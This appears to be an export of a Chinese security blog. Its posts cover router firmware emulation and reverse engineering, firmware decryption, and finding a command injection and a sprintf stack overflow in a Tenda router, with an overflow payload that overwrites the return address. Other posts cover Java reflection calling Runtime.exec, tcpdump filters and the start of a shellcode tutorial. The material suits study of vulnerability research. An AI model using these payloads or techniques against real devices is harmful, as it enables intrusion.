这里虽然正常启动，但是如果不挂载文件夹，还是挺多问题的，所以我更倾向使用系统模式。 所以下面的分析都是在系统模式下的。 这里系统模式不做赘述，我写了个脚本，可以很方便启动。 核心文件比较大，大家按文件自行下载 https://people.debian.org/~aurel32/qemu/mips/ 我把脚本放链接放这里 https://gitee.com/p1piyang/backward-analysis/tree/master/ qemu启动 sudo ./start-mipsel.sh sudo 启动 ifconfig eth0 192.168.5.12 up #qemu中设置ip，qemu里边 将文件系统上传 scp -r squashfs-root/ root@192.168.5.12:/root/ #在主机 挂载 chroot ./squashfs-root/ /bin/sh 启动 ./user/sbin/lighttpd -f ./lighttp/lighttpd.conf 分析刚开始是想直接去分析lighttpd的。随手登陆了一下，看了下包。 我个人浅薄的经验，不要单纯去无目的的分析某个应用，我之前犯过这种错误，太容易对着一个程序漫无目的的乱逛，希望你没有这种情况。 这里明显可以看到调用了cgi文件，之前看文件的时候看到了这个东西的。 可以去分析下这个文件。 ghidra open！！！ Link 死大头！！！ search &quot;action&quot;！！！ action&#x3D;login，交叉引用，看一下。 说实话，ghidra的这个伪代码看着老奇怪了，这里是判断了登陆还是升级。 if下面，这里判断flag&#x3D;1，最后的逻辑是将字符串格式化到acStack4456中 再往下这个地方我刚开始比较懵了，因为websGetVar程序查找表变量var,相当于获取参数。所以这里并没有往下看，而是换了个思路点。 这里知道了他是对登陆做了个判断。 去查找登陆的请求参数 发现了这么个地方。 根据登陆的包。 发现他返回了一串地址。并且主动访问了这串地址。 所以这个地方是判断密码的地方。本来想试试正确密码，来分析下，结果密码怎么都不对。 这里解释下，因为我没有设备，是直接在官网下载的固件，所以这个密码怎么都不对，我怀疑是固件模拟的问题，就没有往下追究。 他主动访问了formloginAuth.htm，在www&#x2F;文件夹下并没有这个文件，所以去找下lighttpd文件分析下 ghidra open！！！ Link 死大头！！！ search &quot;formLoginAuth&quot;！！！ 跟进from_Login函数 这里就发现了参数处理 判断几个参数做了什么，userName是空的先不看，goURL是某个html文件，盲猜他是的从哪来的，action是要做什么。 所以现在要看一下authCode 如果authCode不等于0，iVar2就等于整形的authCode的值。 往下分析。 这里改成1之后直接，跳过了这个判断。 但是只吧这个改为1之后还是返回到登陆界面。 这里pcVar2&#x3D;1，导致跳过了设置pcVar2 &#x3D; home.html 所以我猜测goUrl参数不是从哪来，而是从哪去。 最后发现果然是哦。 其实在ghidra反编译的时候，好多地方不太习惯，很多地方靠函数名和字符串硬猜。 慢慢来吧。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"路由器固件解密思路","slug":"iot/iot固件解密思路","date":"2022-07-20T09:57:32.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/876237c8.html","link":"","permalink":"http://example.com/article/876237c8.html","excerpt":"","text":"学习思路来源于zdi：https://www.zerodayinitiative.com/blog/2020/2/6/mindshare-dealing-with-encrypted-router-firmware 关于如何判断是否加密在另一篇文章有提到： https://p1yang.github.io/2022/04/02/iot/iot学习感悟/ 一般来说固件加密有三种情况： 初始版本未加密，后续某个版本加密了 在加密与初始版本中间某个版本附带了解密程序 ​ 获取中间版本，从中分析解密程序。 老版有加密，后续更换加密方式，中间发布未加密的过渡版本固件 ​ 与1类似，也是同样获取带有解密程序的过渡版本固件分析提取解密程序 老版有加密，后续更换加密方式，中间更换了新的未加密的解密程序 ​ 如果清楚早期加密方式，或者拥有早期解密程序，可以去分析更换解密程序的中间版本，来获取解密程序。 ​ 如果没有早期相关解密信息，则无法使用上面方式，更多是购买设备，从硬件直接提取未加密的固件。 ​ 理论上，可以使用二进制对比分析工具，来分析尝试提取复原解密程序。 这是选用了经典的Dlink-DIR882的固件进行分析： ftp：ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/ 从固件时间顺序往早期查验 发现DIR882A1_FW104B02_Middle_FW_Unencrypt.bin就是我们所说的过渡版本。 提取，分析，我们要通过他来查找解密程序。 或者复现根据升级路径来查找。 这里比较幸运通过关键字查到在bin下的imgdecrypt，但我们不能确定他一定是正确的解密程序 我们尝试执行他。 跟上面对比，正确能够被识别出文件。 尝试将其他固件也都测试下 上面是命名比较规范的一种，有些命名不规范可能需要去根据前端升级去寻找相应的功能。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"iot学习感悟","slug":"iot/iot学习感悟","date":"2022-07-20T09:57:32.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/41f88cb3.html","link":"","permalink":"http://example.com/article/41f88cb3.html","excerpt":"","text":"关于加密前期接触iot我们遇到固件基本都是binwalk一把梭，但有时候会遇到固件信息混乱，或者分析出来一堆zlma的文件，没有发现有rtos或者文件系统的标志。 这时候会考虑到是否加密，上网查会发现有用 binwalk 的 -E 参数来判断。 那么这个判断的原理是啥？ 原理是信息熵。 熵：泛指某些物质系统状态的一种量度，某些物质系统状态可能出现的程度。 初高中应该都学过，熵值越大，说明系统越混乱。 信息熵：1948年C.E.Shannon（香农）从热力学中借用过来提出的概念，解决了对信息的量化度量问题 信息中，重复的内容越多，系统越稳定，能获得的信息越多。 对于没有加密的二进制文件来说，某些指令出现的频率通常很高（如序言、nop序列等），并且数据结构几乎没有随机性。重复概率很高 所以，对于未加密的数据来说熵值一般会比较低。 对于经过加密的文件来说，都会想尽办法隐藏自己的信息，而导致很少有重复的内容，也就导致重复概率低 所以，加密的熵值一般都会高。 上面就是通过信息熵来判断是否加密，binwalk使用相关算法来整理信息熵 关于web服务嵌入式的web服务通常是cgi+http 或 lua+http cgi是叫公共网关接口，是Web 服务器运行时外部程序的规范，按CGI 编写的程序可以扩展服务器功能 Lua 是一种轻量小巧的脚本语言,用标准C语言编写并以源代码形式开放, 其设计目的是为了嵌入应用程序中,从而为应用程序提供灵活的扩展和定制功能。 常见的嵌入式设备使用的web服务多为以下几款 boa单一任务型的http服务器，只会对CGI请求进行fork进程，没有访问控制功能，身份认证都是厂商后边开发的。 通过translate_uri函数解析请求路径I判断是否为CGI请求，调用init_cgi来execve执行相关CGI程序 translate_uri函数中的init_script_alias函数，负责解析ScriptAlias请求，设置请求cgi类型，查看文件是否存在以及具有相关权限 通过ScriptAlias在boa.conf配置文件中，该指令设置CGI执行的真实目录 不止是boa，nginx的设置中也存在alias，小米路由器就曾因为这个设置导致路径穿越 uhttpdopenwrt的默认http服务器，主要是为了和LucI Web接口方便OpenWrt设备管理。 支持与cgi，lua，UBUS来完成请求。 uhttpd使用LuCI框架编写lua处理脚本，安全审计偏向于Web安全中的代码审计。 但也有一些存放的lua脚本是编译过的，需要逆向。 uhttp下dispatch_find函数根据请求的url找到合适的dispatch_handler。 请求的url通过check_cgi_path函数校验，则会调用cgi_handle_request函数回调cgi_main函数execl执行对应的CGI程序 最终调用的/www/cgi-bin/luci即Luci，luci是MVC设计思想的web后端框架。 简单了解下，后面一款小米路由器分析思路会详细介绍 Goahead在route.txt定义的路由规则，根据匹配的URI来执行不同的handler：有action handler直接在GoAhead进程中执行C函数，CGI handler执行新的CGI程序，也有默认的file handler处理文件请求，还可以自定义新的handler 详细请看官方文档：https://www.embedthis.com/goahead/doc/ 调用websUrlHandlerRequest函数找到匹配URL前缀的处理函数，可以借助websFormDefine函数定义与formName相关联的C处理函数 由上面几个可以看出来，都是通过URL来选择执行CGI&#x2F;lua或是内部程序 并且根据PATH_INFO选择执行程序内最终的handler函数。 这里属于个人复述，这个文章比较详细：https://github.com/Larryxi/Larryxi.github.io/blob/master/_posts/2020-02-03-iot-web-server-cgi-handler-analysis.md 分析的一些思路分析的话根据上面的东西来看 一定要有个设备，或者去模拟这些设备。 保证正常的web访问，方便查看功能调用的url&#x2F;接口。 一定不要去公网站直接用人家的设备，要做个守法的好孩子！！！ 根据上面的知识来获取相关功能的具体实现位置。 然后分析危险函数，以及是否可控。 或者 从危险函数向外分析功能点。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"tenda路由器的漏洞发现","slug":"iot/tenda路由器的漏洞发现","date":"2022-07-20T09:57:32.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/44df6587.html","link":"","permalink":"http://example.com/article/44df6587.html","excerpt":"","text":"分析这款是tendaA1206，固件是比较早的未加密的那个。 都是些个人学习过程中的思考与知识，整理下来。 固件在这：https://p1yang.github.io/2022/04/22/iot/tenda路由器的漏洞发现/ 前期准备都是些老生常谈的东西可以跳过。 这里使用的qemu-user，方便 至于分析的文件在下面思路中会聊到，这里环境模拟启动的是&#x2F;bin&#x2F;httpd 文件 复现环境是qemu+ghidra(反编译伪代码，我个人比较习惯ghidra的伪代码)+ida7.5(动态调试) binwalk解包，文件格式，qemu-user模式启动等这些就不赘述，主要说几个环境模拟时的几个小问题。 问题1 第一次运行时爆出这个错误停止。string大法发现在main中 apmib_init函数从flash中读取mib值到RAM中，像这种模拟是办不到的东西，直接patch代码或更改寄存器值来绕过(尝试了下没办法直接patch代码，可以试试patch机器码，比较麻烦，我就直接改寄存器了) 在mips的判断是bne，btgz等，将断点下在他们上，他们通常依靠v0寄存器的值来做判断。 此时v0值为0，改为1跳过 问题2这里陷入个死循环，问题点在 也尝试更改寄存器v0的值成功绕过。 问题3 继续string大法 抱歉这里我并没有查到这个函数的是干什么的，有清楚的请告诉我，提前感谢。 不影响，改寄存器大法。 问题4上面没问题之后发现ip开在255.255.255.255上。 string大法搜 listen ip inet_ntoa函数的意思是，功能是将网络地址转换成“.”点隔的字符串格式。 所以跟sockaddr.sin_port有关，查看引用 inte_addr 功能是将一个点分十进制的IP转换成一个长整型数（u_long类型）等同于inet_addr()。 与host有关，再向前查看 其参数为全局变量 g_lan_ip。设置个lanip sudo tunctl -t br0 -u ‘用户名’ sudo ifconfig br0 192.168.5.1&#x2F;24 ps eth1就是第二块网卡第一块通常是eth0 tap是虚拟网络接口 br是网桥 这个设置完之后问题2直接解决了。 分析思路分析其使用的web服务器，常见的嵌入式有以下几种：httpd，uhttpd，gohead，lighttpd，boa 还有其他的，我没咋见过，就不写了，用到的话自行查阅（懒！） 我分析这款使用的是httpd，在bin目录下，一般服务器文件都在一下几个目录，不排除其他目录 /user/bin/ /user/sbin/ /bin/ 在逆向分析httpd时，尽量关注一些自定义功能代码，main下调用的initwebs函数中，配置了前端访问方式 可以看到默认页面main， websSetPassword设置访问口令，不多说各位调试的时候可以关注一下。 websUrlHandlerDefine需要关注，这个函数的意思是什么样的url交给谁处理。 上面说了尽量关注一些自定义功能代码 这里的自定义功能代码就在formDefineTendDa中 上面这些都是通过goform来处理的，所以其访问形式为 http://127.0.0.1:80/goform/TendaGetLongString这样的 哪个路径就交由哪个函数来处理。 下面分析可以由两方面展开： 分析各个功能点 简单来说就是将所有接口的代码过一遍，去分析参数从哪里来，有没有经过什么危险函数 这种的话效率比较低，我个人推荐第二种 通过危险函数来查找可利用点，利用逆向分析工具的交叉编译功能查找 这里放一张危险函数表 dosystemcmd system 根据上面的函数表来将危险函数过一下 下面是之前分析到的两个问题的思路，住这里不涉及exp，poc等脚本的编写，还是以思路为主。 命令执行过一遍dosystemcmd函数 可以看到有145次调用，感觉有漏洞的几率还是挺大的 注意点，尽量找form这类的函数，即上面说的自定义功能，有前后端交互 且危险函数的参数来自于前端参数 websGetVar就是从wp中获取其第二个参数对应的值，如果没有该参数，值默认为第三个参数。 上面可以看到这里pcVar1未作任何处理直接拼接到参数中。 这里就产生了命令执行，不多做赘述，各位有兴趣可自行复现。 溢出溢出是在strpintf函数的调用中发现的。 goform&#x2F;NatStaticSetting路径访问到fromNatStaticSetting函数 sprintf函数将page的参数给拼接到字符串中，未做长度校验，导致溢出 复现过程： 断点到fromNatStaticSetting函数入口 将调用fromNatStaticSetting函数的返回地址放入0x407FFAE4 处 向下执行到第三个websGetVar函数获取page参数，然后向下执行sprintf函数，将page参数的内容拼接到gotopage内，由代码可知长度为256 参数初始化完毕后发现gotopage位置为0x407FF9E0 这里我们传入page参数为： page=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaacAAAA 执行完后 返回地址0x407FFAE4已经被AAAA覆盖。 上面是一些思路之类的东西，第一个命令执行晚了几天。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"关于我","slug":"余/aboutMe","date":"2022-07-20T09:57:32.000Z","updated":"2023-12-21T06:37:28.660Z","comments":true,"path":"article/9ff79b23.html","link":"","permalink":"http://example.com/article/9ff79b23.html","excerpt":"","text":"我 p1yang 24（年轻人，不讲武德） rewirte战队成员（感谢我的几位好哥哥带我） 万年单身狗（有喜爱狗狗的小姐姐可以考虑下）（bushi） 2023成功追女生失败，还是一个单身狗。 一个网络安全爱好者（师傅们带带我） 菜鸡（这是真的） 二进制玩家（这玩意好难，好难，好难！！！） android开发专业废物（我ui画的贼溜） 复制诗歌爱好者（致橡树我真的太喜欢了！！！） 初音厨（即使离婚了我也爱她） ”日常“番爱好者（没有未来的未来不是我想要的未来） 正在学画本子的渣渣（哎嘿嘿） 英雄联盟万年黑铁（我闪现撞墙贼溜） 爹一只会窝在后排打狙（十倍镜都打不到人） csgo皮肤收藏家（就是买不起而已，rush B gogogo！） 这个博客算是第二次迁移了吧，之前在云服务器上的也停了，文章也没来得及保存。 这里就算一个新的开始吧。 最后留个联系方式吧，师傅们有想要交流的技术或者不嫌弃我菜，一块耍爹1或者本人博文有问题的地方联系qq提醒我修改吧。 qq：397712823","categories":[{"name":"杂七杂八的唠叨话","slug":"杂七杂八的唠叨话","permalink":"http://example.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%94%A0%E5%8F%A8%E8%AF%9D/"}],"tags":[],"keywords":[{"name":"杂七杂八的唠叨话","slug":"杂七杂八的唠叨话","permalink":"http://example.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%94%A0%E5%8F%A8%E8%AF%9D/"}]},{"title":"java序列化与反序列化","slug":"技/java序列化与反序列化","date":"2022-03-16T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/335a6663.html","link":"","permalink":"http://example.com/article/335a6663.html","excerpt":"","text":"java序列化指的是将java对象转化为字节序列的过程java反序列化指字节序列恢复到java对象 基础知识 计算机内存最小单位为一个二进制位，即 0或1我们吧这个二进制位称为一个bit（比特）位 一个字节（byte）有八个比特位，即 byte &#x3D; 8*bit如果八个bit位都为1，即这个字节最大为 FF &#x3D; 1111 1111 一个字（word）是两个byte，即 word &#x3D; 2 * byte &#x3D; 16 * bit则一个字最大为 FFFF doubleword 双字，是两个word ，即四个byte，32*bit一个doubleword为FFFF FFFF 一般情况下使用最多的是字节，字节相当于人民币的元一样，虽然不是最低的，但却是最常用的 一串字符在内存中一般是以ascii编码形式存在，不同编码占用子节长度不同 一个ascii码的占用一个字节 unicode码占用一个字（两个字节）utf-8 是我们国内常用的是针对unicode码的一种可变编码方式。asciiunicode字节序当一串数据太大的时候，一个字节放不下，就需要使用多个字节比如0x12345678就需要四个字节而现在就有了两种存放方式我们称这两种为 小端序和大端序小端序从屁股开始，大端序从头开始小端序大端序各家架构不同，使用的大小端序不同，无需纠结但是后来计算机网络通信出来了，大家如果有不同的话会导致混乱tcp&#x2F;ip协议出来之后就规定网络通信必须使用大端序以上就是字节序的基本知识 序列化与反序列化序列化： 对象序列化的最主要的用处就是在传递和保存对象的时候，保证对象的完整性和可传递性。序列化是把对象转换成有序字节流，以便在网络上传输或者保存在本地文件中。序列化后的字节流保存了Java对象的状态以及相关的描述信息。序列化机制的核心作用就是对象状态的保存与重建。 反序列化： 客户端从文件中或网络上获得序列化后的对象字节流后，根据字节流中所保存的对象状态及描述信息，通过反序列化重建对象。 序列化就是把实体对象状态按照一定的格式写入到有序字节流，反序列化就是从有序字节流重建对象，恢复对象状态。 上面的简单点说，进程间通信可以将图片，视频，音频等信息用二进制方式传输。但是进程间的对象却不能这么搞。 比如我创建了一个User u1 &#x3D; new User(1,”a”,100);我要将它传给另一个软件（进程）进程间的对象想要传输就需要序列化和反序列化序列化为二进制数据，可以永久存在硬盘里，也可以进行网络传输 实现java序列化和反序列化下面嫌太长了可以直接看例子 JDK类库中序列化和反序列化APIjava.io.ObjectOutputStream： 表示对象输出流；它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中；java.io.ObjectInputStream：表示对象输入流；它的readObject()方法源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回； 实现序列化的要求 只有实现了Serializable或Externalizable接口的类的对象才能被序列化，否则抛出异常！ 实现Java对象序列化与反序列化的方法若User类仅仅实现了Serializable接口，则可以按照以下方式进行序列化和反序列化 ObjectOutputStream采用默认的序列化方式，对User对象的非transient的实例变量进行序列化。ObjcetInputStream采用默认的反序列化方式，对对User对象的非transient的实例变量进行反序列化。 若User类仅仅实现了Serializable接口，并且还定义了readObject(ObjectInputStream in)和writeObject(ObjectOutputSteam out)，则采用以下方式进行序列化与反序列化。 ObjectOutputStream调用User对象的writeObject(ObjectOutputStream out)的方法进行序列化。ObjectInputStream会调用User对象的readObject(ObjectInputStream in)的方法进行反序列化。 若User类实现了Externalnalizable接口，且User类必须实现readExternal(ObjectInput in)和writeExternal(ObjectOutput out)方法，则按照以下方式进行序列化与反序列化。 ObjectOutputStream调用User对象的writeExternal(ObjectOutput out))的方法进行序列化。ObjectInputStream会调用User对象的readExternal(ObjectInput in)的方法进行反序列化。 实例user对象，使用的是上述第一种方式，所以User要实现Serializable import java.io.Serializable; public class User implements Serializable &#123; int id; String name; String phone; #一些get set 构造参数，这里就不列举了 &#125; 序列化与反序列化 import java.io.*; public class userDemo &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; //创建对象 User u1 = new User(1,&quot;AAAAAAA&quot;,&quot;110&quot;); //被序列化的对象 User u2; //反序列化的对象 //序列化 getSerial(u1); //反序列化 u2 = backSerial(); System.out.println(u2.getName()); &#125; //序列化 static void getSerial(User u1) throws IOException &#123; FileOutputStream fos = new FileOutputStream(&quot;obj.out&quot;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(u1); oos.flush(); oos.close(); &#125; //反序列化 static User backSerial() throws IOException, ClassNotFoundException &#123; FileInputStream fis = new FileInputStream(&quot;obj.out&quot;); ObjectInputStream ois = new ObjectInputStream(fis); User u1 = (User) ois.readObject(); return u1; &#125; &#125; 序列化底层分析ObjdectOutputStream对象的初始化 bout是数据输出流的底层writeStreamHeader将文件头写入文件这里根据序列化的文件分析所以这里是写入文件头，表示声明使用序列化协议以及说明序列化版本初始化完毕，文件存在且写入了文件头。开始序列化写入文件writeObject(u1);向下调用write0ject0();这个方法的内容比较长重要点在意思是按照不同类型的方法去写入序列化数据，可以看上面实现Java对象序列化与反序列化的方法我们实例中实现了Serializable，所以执行writeOrdinaryObject方法bout.writeByte(TC_OBJECT); 写入了0x73调用 writeClassDesc(desc, false);跟进这里isProxy是判断类是否是动态代理模式 具体可以自行了解，我也不清楚因为我们实例的类不是动态代理，所以跟进writeNonProxyDesc();先写入了描述符号0x72下面判断跟进两个参数一个为1，一个为2跟进writeClassDescriptor(desc);和true执行同一个方法在开发中，我们经常会遇到要经过for循环来判断该循环体中是否包含或不包含某一元素，这个时候我们也常用一个boolean值来介入判断。而“|&#x3D;”可以轻松的让我们完成实现 boolean flag &#x3D; false; 在一个循环体中，flag |&#x3D; (c&#x3D;&#x3D;e);如果一直不相等，则flag一直为false,一旦有一个相等则为true； out.writeUTF(name); 写入类名out.writeLong(getSerialVersionUID());写入序列化uid 再往下一堆if判断接口的实现方式，将标志位写入out.writeByte(flags); 我们使用serializable，所以应该写入0x02所以从0x000B - 0x0013 都是序列化uid然后调用writeShort写入两个字节的域长度（比如说有3个变量，就写入 00 03 )实例中有三个参数接下来就是循环写入变量名和变量类型 每轮循环: writeByte写入一个字节的变量类型; writeUTF()写入变量名 判断是不是原始类型，即是不是对象 不是原始类型(基本类型)的话，就调用writeTypeString()这个writeTypeString()，如果是字符串，就会调用writeString() 而这个writeString()往往是这样写的，字符串长度(不是大小)小于两个字节，就先写入一个字节的TC_STRING(16进制 74)，然后调用writeUTF()，写入一个signature，这好像跟jvm有关，最后一般写的是类似下面这串 74 00 12 4c 6a 61 76 61 2f 6c 61 6e 67 2f 53 74 72 69 6e 67 3b“翻译”过来就是，字符串类型，占18个字节长度，变量名是 Ljava&#x2F;lang&#x2F;string;红色 id参数 int 类型绿色 name 参数 string 因为 String是引用数据类型所以调用了writeTypeString() 写入了Ljava&#x2F;lang&#x2F;string;黄色 phone 参数 string这里第一次看有个疑问phone参数也是string，但是他却没Ljava&#x2F;lang&#x2F;string;这一串后边又增加一个string的参数，确定同一种引用数据类型只写入一次。 循环执行完，返回到writeNonProxyDesc方法写入结束标志位0x78bout.writeByte(TC_ENDBLOCKDATA);准备开始写入序列化数据回到writeOrdinaryObject()方法writeSerialData(obj, desc);方法来写入序列化数据这里根据使用方式来判断，所以调用了 defaultWriteFields();第二个if是判断是否为基本数据类型，是的话就会直接写入序列化数据，不是的话向下到for循环附近获取变量数，然后循环调用writeObject0()；写入循环结束，直到所有运行完成，回到主函数。反序列化就不写了，反反过来推一遍就成。 java反射机制反射机制允许程序在运行期借助于Reflection API取得任何类的内部信息，并能直接操作任意类和对象的所有属性及方法。 要使用一个类，就要先把它加载到虚拟机中，在加载完类之后，堆内存的方法区中就产生了一个Class类型的对象（一个类只有一个class对象），这个对象就包含了完整的类的结构信息，我们可以通过这个对象看到类的结构，这个对象就像一面镜子，透过镜子可以看到类的结构，所以形象的称之为：反射。实例： import java.lang.reflect.Method; public class test &#123; public static void main(String[] args) throws Exception &#123; a1Class a1 = new a1Class(); //通过运行时的对象调用getClass(); Class c = a1.getClass(); try &#123; //getMethod(方法名,参数类型) //getMethod第一个参数是方法名，第二个参数是该方法的参数类型 //因为存在同方法名不同参数这种情况，所以只有同时指定方法名和参数类型才能唯一确定一个方法 Method m1 = c.getMethod(&quot;print&quot;, int.class, int.class); //相当于r1.print(1, 2);方法的反射操作是用m1对象来进行方法调用 和r1.print调用的效果完全相同 //使用r1调用m1获得的对象所声明的公开方法即print，并将int类型的1,2作为参数传入 Object i = m1.invoke(a1,1,1); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; static class a1Class &#123; public void print(int a, int b) &#123; System.out.println(a + b); &#125; &#125; &#125; 尝试简化上面的代码创建另一个文件 public class testMiao &#123; public static void maio()&#123; System.out.println(&quot;miao!&quot;); &#125; &#125; 使用反射来执行miao(); public class test &#123; public static void main(String[] args) throws Exception &#123; try &#123; Object s = Class.forName(&quot;testMiao&quot;).getMethod(&quot;maio&quot;).invoke(null); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125; 尝试添加参数简化public class testMiao &#123; public static void maio(String s)&#123; System.out.println(&quot;miao!&quot;+s); &#125; &#125; 反射 public class test &#123; public static void main(String[] args) throws Exception &#123; try &#123; Class.forName(&quot;testMiao&quot;).getMethod(&quot;maio&quot;, String.class).invoke(Class.forName(&quot;testMiao&quot;),&quot;aaa&quot;); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125; java执行命令java中可以使用Runtime.getRuntime.exec();来执行系统命令如：尝试使用反射来执行 Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class).invoke(&quot;open /System/Applications/Calculator.app\\n&quot;); 这样会报错，报错的信息：是对象不是声明类的实例说明exec只能是通过getRuntime来执行 import java.lang.reflect.Method; public class test &#123; public static void main(String[] args) throws Exception &#123; Object o = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null); Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class).invoke(o,&quot;open /System/Applications/Calculator.app\\n&quot;); &#125; &#125; 这样会成功，原理跟随反射实例第一个实例来理解。现在可以打开计算器，明白什么是序列与反序列化了。 关于cc1的链，之后再写，可以看bilibili 白日梦组长分析思路我个人觉得他的思路是真的超级棒。","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"tcpdump抓包","slug":"技/tcpDump","date":"2021-10-08T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/201a570f.html","link":"","permalink":"http://example.com/article/201a570f.html","excerpt":"","text":"抓包原理当网卡接收到一个网络报文后，会去遍历系统中所有已经注册了的网络协议，来尝试报文处理。 抓包模块会将自己伪装成一个网络协议，系统在遍历的时候就会发给抓包模块一份，抓包趁机将报文复制一份 tcpdump用法注意，需要root权限 使用 -w a .pcap 保存到数据包 tcpdump 抓取所有经过第一网络接口的数据包 tcpdump -i lo0 抓取某个网卡的数据 lo0是我本地网卡，用ifconfig可以查看 tcpdump -i en0 host 110.242.68.3 抓取经过en0 其目标地址或者源地址是110.242.68.3的数据包 tcpdump -i bridge100 host 192.168.150.1 and 192.168.150.14 抓取经过bridge100的主机192.168.150.1 与主机192.168.150.14间的流量包 tcpdump -i bridge100 -n host 192.168.150.1 and ! 192.168.150.14 抓取经过bridge100的主机192.168.150.1 与除了主机192.168.150.14的所有流量包 tcpdump src host 192.168.150.14 抓取主机192.168.150.14 发送的所有数据 tcpdump dst host 192.168.150.14 抓取所有流向192.168.150.14的数据 tcpdump host 192.168.150.14 and tcp port 80 抓取主机192.168.150.14所有在TCP 80端口的数据包： tcpdump host 192.168.150.14 and dst port 80 抓取主机192.168.150.14所有在http 80端口的数据包： tcpdump port 80 抓取80端口获取或者发送的数据，可以用dst和src来来区分 tcpdump net 192.168 抓取网络192.168的数据，可以用dst和src来来区分 tcpdump 协议名 过滤协议 tcpdump ‘((tcp) and (port 80) and ((dst host 192.168.150.1) or (dst host 192.168.150.14)))’ 目标是主机（192.168.150.1 或者192.168.150.14） 的 80端口的tcp的数据，注意理解其用法 tcpdump ‘tcp[tcpflags] &#x3D; tcp-syn’ 只抓syn包，如果要抓syn和ACK包 去掉等号及其后面 tcpdump ‘((port 25) and (tap[(tcp[12]&gt;&gt;2):4] &#x3D; 0x4d41494c))’ 抓取数据区开头为MAIL的包，MAIL的十六进制为 0x4d41494c tcpdump ‘tcp[(tcp[12] &gt;&gt; 2):4 &#x3D; 0x47455420]’ 抓取get包，get的十六进制0x47455420，post同理","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"Windows ShellCode提取加载与免杀","slug":"逆/ShellCode","date":"2021-09-06T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/570c6a7.html","link":"","permalink":"http://example.com/article/570c6a7.html","excerpt":"","text":"这篇文章仅讲windows下的，linux下比较简单，之后可能会写 shellcode是一段用于利用软件漏洞而执行的代码 编写首先说明，shellcode编写可以用c也可以直接用汇编来写，但难度不在一个层级，我们选择c》 vs我用的是vs2013，本来用的2008，但是找不到汇编窗口 下面是windows shellcode编写的步骤 获取kernel32.dll 基地址； 定位 GetProcAddress函数的地址； 使用GetProcAddress确定 LoadLibrary函数的地址； 然后使用 LoadLibrary加载DLL文件（例如user32.dll）； 使用 GetProcAddress查找某个函数的地址（例如MessageBox）； 指定函数参数； 调用函数。 首先要注意shellcode的地址无关原则 char* arr = &quot;test&quot;; 我们看到这么写的话 test存放在一个固定地址，而不同windows下的内存地址是不同的，所以我们不能将地址写死 char cmd[] = &#123; &#x27;c&#x27;,&#x27;a&#x27;,&#x27;l&#x27;,&#x27;c&#x27;,&#x27;\\x00&#x27;&#125;; 但上面这种写法就不会有固定地址，但这样写需要用\\x00来截断 现在地址无关解决，下一步是函数调用，我们需要kernel32.dll 基地址，但是由于ASLR导致dll可以加载到不同的内存位置，需要动态定位 PEB结构位于固定内存位置，所以我们可以通过PEB来获取。 读取PEB结构 跳转到0xC偏移处读取Ldr指针 跳转到0x14偏移处读取 InMemoryOrderModuleList字段 如果你不太懂上面三步，尽量多思考一下下面的内容 进程：是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，可以简单的理解为，计算机中每运行的一个软件都是一个进程。 